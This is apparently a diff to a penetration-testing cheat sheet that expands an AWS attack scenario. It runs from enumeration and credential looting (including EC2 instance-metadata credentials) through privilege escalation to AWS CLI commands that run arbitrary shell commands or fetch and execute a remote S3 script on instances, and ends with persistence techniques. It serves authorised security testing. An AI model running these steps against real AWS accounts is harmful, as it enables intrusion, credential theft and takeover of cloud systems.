@@ -25,7 +25,7 @@ Technical notes, list of tools, scripts and commands that are useful for assessi
 
 ### III. AWS Penetration Testing  
 3.1. [AWS customer support and service policy for penetration testing](#31-aws-customer-support-and-service-policy-for-penetration-testing)  
-3.2. [AWS pentest methodology - Usefull ressources](#32-aws-pentest-methodology---usefull-ressources)  
+3.2. [AWS pentest methodology](#32-aws-pentest-methodology)  
 3.3. [List of AWS penetration testing tools](#33-list-of-aws-pentest-tools)  
 3.4. [List of AWS pentesting and security CTFs](#34-list-of-aws-cloud-pentesting-and-securty-ctfs)  
 
@@ -1656,36 +1656,75 @@ Link - https://aws.amazon.com/pt/security/penetration-testing/
   - https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/AWS.md
 
     
-##### 3.2.2. CLASSIC AWS PENTEST SCENARIO 
+##### 3.2.2. CLASSIC AWS PENTEST SCENARIOS 
 
-  - STEP 1 - Gaining Access
-    + Find on an unprotected public S3 bucket clear-text AWS account credentials hardcoded in a config file, a script, or a log files  
-    + Find and exploit a Website hosted on a EC2 Windows or Linux VM and then use 
-   
-    + 
-  - STEP 2 - Privielge Escalation
+  - STEP 1 - Scanning and Enumeration
+    + Use tools like:
+      + [S3_objects_check](https://github.com/nccgroup/s3_objects_check)
+      + [S3Scanner](https://github.com/sa7mon/S3Scanner) 
+      + [Cloud_enum](https://github.com/initstring/cloud_enum)
+      + ...
+    + Discover and loot public S3 Buckets
+    + Discover and loot public EBS snapshots
+    + Discover and loot public Amazon Machine Images (AMIs)
+    + Detect Public Resource Exposure via Session Policy Error Messages
+    + ...
+
+  - STEP 2 - Gaining Access
+    + Find clear-text AWS credentials hardcoded in a config file, a script, or a log files stored in:
+      + unprotected S3 buckets
+      + unprotected Amazon Machine Images (AMIs) 
+      + unprotected Github / Gitlab / JFrog repositories
+      + ...
+    + Find and exploit a critical vulnerability on a Website hosted on a EC2 Windows or Linux VM  
+      then found AWS credentials hardcoded in a config file, a script, or a log files stored on the EC2 VM  
+      or try to collect AWS creds in the the Meta-data of the EC2 VM (http://169.254.169.254/latest/meta-data/iam/security-credentials/<xxx>)
+    + ...
+
+  - STEP 3 - Privilege Escalation
+    + Discover privilege escalation paths across multiple AWS services with tools like:
+      + [HEIMDALL](https://github.com/DenizParlak/heimdall)
+      + [CloudPEASS](https://github.com/peass-ng/CloudPEASS)
+      + ...
     
-  - STEP 3 - Post Exploitation
- 
-    + After gaining escalating privileges in a target AWS account or gaining privileged access you may want to run commands on EC2 instances in the account.  
-      Leverage privileged access in an AWS account to run arbitrary commands on an EC2 instance.
-
-      ✓ SEND COMMAND - ssm:SendCommand
-        Send arbitrary shell commands to EC2 instances from the AWS CLI via the following:
-        ```
+  - STEP 4 - Post-Exploitation
+    + After escalating privileges you may want to run OS commands and take over EC2 instances in the AWS account.  
+      Leverage privileged access in a compromised AWS account to run arbitrary commands on EC2 instances.
+      ```
+      Example 1 (ssm:SendCommand & ssm:ListCommandInvocations)
+      --------------------------------------------------------
+      ✓ Send arbitrary shell commands to EC2 instances from the AWS CLI via the following:
+      
         aws ssm send-command \
         --instance-ids "i-00000000000000000" \
         --document-name "AWS-RunShellScript"
         --parameters commands="*shell commands here*"
-       ```
-      ✓ LIST COMMAND - ssm:ListCommandInvocations  
-       If you would like to retrieve the output, make a note of the CommandId returned to you in the Send Command call.  
-       After a short period of time (to let the command run) you can use this Id to lookup the results. You can do this with the following:
-       ```
-       aws ssm list-command-invocations \
-       --command-id "command_id_guid" \
-       --details
-       ```  
+      
+      ✓ If you would like to retrieve the output, make a note of the CommandId returned to you in the Send Command call.  
+        After a short period of time (to let the command run) you can use this Id to lookup the results.
+        You can do this with the following:
+      
+        aws ssm list-command-invocations \
+        --command-id "command_id_guid" \
+        --details
+      ```
+      ```
+      Example 2 (AWS-RunRemoteScript)
+      --------------------------------
+      ✓ It downloads from remote locations scripts and executes them. It supports S3 Buckets and GitHub repositories.
+        It works for both UNIX and Windows machines.
+
+        aws ssm send-command --document-name "AWS-RunRemoteScript" \
+        --instance-id i-06ae9883fe6e5d721 \
+        --parameters '{"sourceType":["S3"], "sourceInfo":["{\"path\":\"s3://my-bucket/script.sh\"}"]}'
+      ```
+
+  - STEP 5 - Persistence
+    + Numerous persistence techniques exist:
+      + Establish persistence using 'iam:CreateAccessKey', 'iam:CreateLoginProfile', 'iam:UpdateAssumeRolePolicy', etc.
+      + Establish persistence using a Lambda function
+      + ...
+
 
 #### 3.3. LIST OF AWS PENTEST TOOLS
 
